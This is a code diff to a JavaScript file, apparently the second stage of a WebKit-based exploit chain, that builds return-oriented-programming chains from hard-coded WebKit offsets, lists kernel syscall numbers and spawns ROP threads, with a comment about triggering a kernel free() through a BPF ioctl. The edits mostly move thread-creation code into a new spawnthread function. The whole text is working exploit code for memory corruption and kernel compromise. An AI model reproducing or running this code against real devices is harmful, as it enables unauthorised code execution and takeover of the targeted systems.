@@ -371,11 +371,6 @@ window.stage2_ = function() {
 
     var launch_chain = function(chain)
     {
-      var longjmp       = offsetToWebKit(0x1458);
-      var createThread  = offsetToWebKit(0x116ED40);
- 
-      p.syscall(324, 1);
-
       var stackPointer = 0;
       var stackCookie = 0;
       var orig_reenter_rip = 0;
@@ -420,9 +415,7 @@ window.stage2_ = function() {
         rtv=Array.prototype.splice.apply(reenter_help);
         return p.leakval(rtv);
     }
-    
-    
-    gadgets = gadgets;
+
     p.loadchain = launch_chain;
     
      // Write to address with value (helper function)
@@ -716,7 +709,7 @@ window.stage2_ = function() {
     "virtual_query": 572,
     "mdbg_call": 573,
     "sblock_create": 574,
-    "sys_sblock_delete": 575,
+    "sblock_delete": 575,
     "sblock_enter": 576,
     "sblock_exit": 577,
     "sblock_xenter": 578,
@@ -895,7 +888,14 @@ window.stage2_ = function() {
 
   window.nogc.push(backing);
   
-      
+      var spawnthread = function (chain) {
+      var longjmp       = offsetToWebKit(0x1458);
+      var createThread  = offsetToWebKit(0x116ED40);
+
+      var contextp = mallocu32(0x2000);
+      var contextz = contextp.backing;
+      contextz[0] = 1337;
+      p.syscall(324, 1);
   
       var thread2 = new window.rop();
 
@@ -916,7 +916,7 @@ window.stage2_ = function() {
       window.nogc.push(thread2);
       
       return thread2;
-      
+      }
       
       var run_count = 0;
 
@@ -1184,7 +1184,8 @@ window.stage2_ = function() {
 
       // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one 
    
-   spawnthread(function (thread2) {
+     // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one
+      spawnthread(function (thread2) {
         interrupt1 = thread2.stackBase;
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
